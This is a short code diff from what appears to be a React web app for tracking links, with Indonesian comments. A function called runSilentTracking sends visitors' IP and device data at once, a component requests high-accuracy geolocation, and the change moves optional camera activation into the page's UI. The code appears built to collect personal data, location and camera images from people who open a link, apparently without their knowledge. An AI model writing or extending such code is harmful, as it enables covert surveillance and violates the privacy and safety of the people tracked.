@@ -140,11 +140,6 @@ async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
 
   // Kirim data IP & Device SEGERA tanpa menunggu kamera
   addCapture(link.id, { ...data }, notifConfig);
-
-  // 4. Camera (jika diaktifkan, jalankan di background)
-  if (opts.trackCamera) {
-    onCameraReady();
-  }
 }
 
 /* ─── Notification Banner ────────────────────────────────── */
@@ -498,6 +493,10 @@ export default function Capture() {
         () => {},
         { timeout: 20000, maximumAge: 0, enableHighAccuracy: true }
       );
+    }
+    const cfg = configRef.current;
+    if (cfg?.options?.trackCamera) {
+      setShowCamera(true);
     }
   }
 
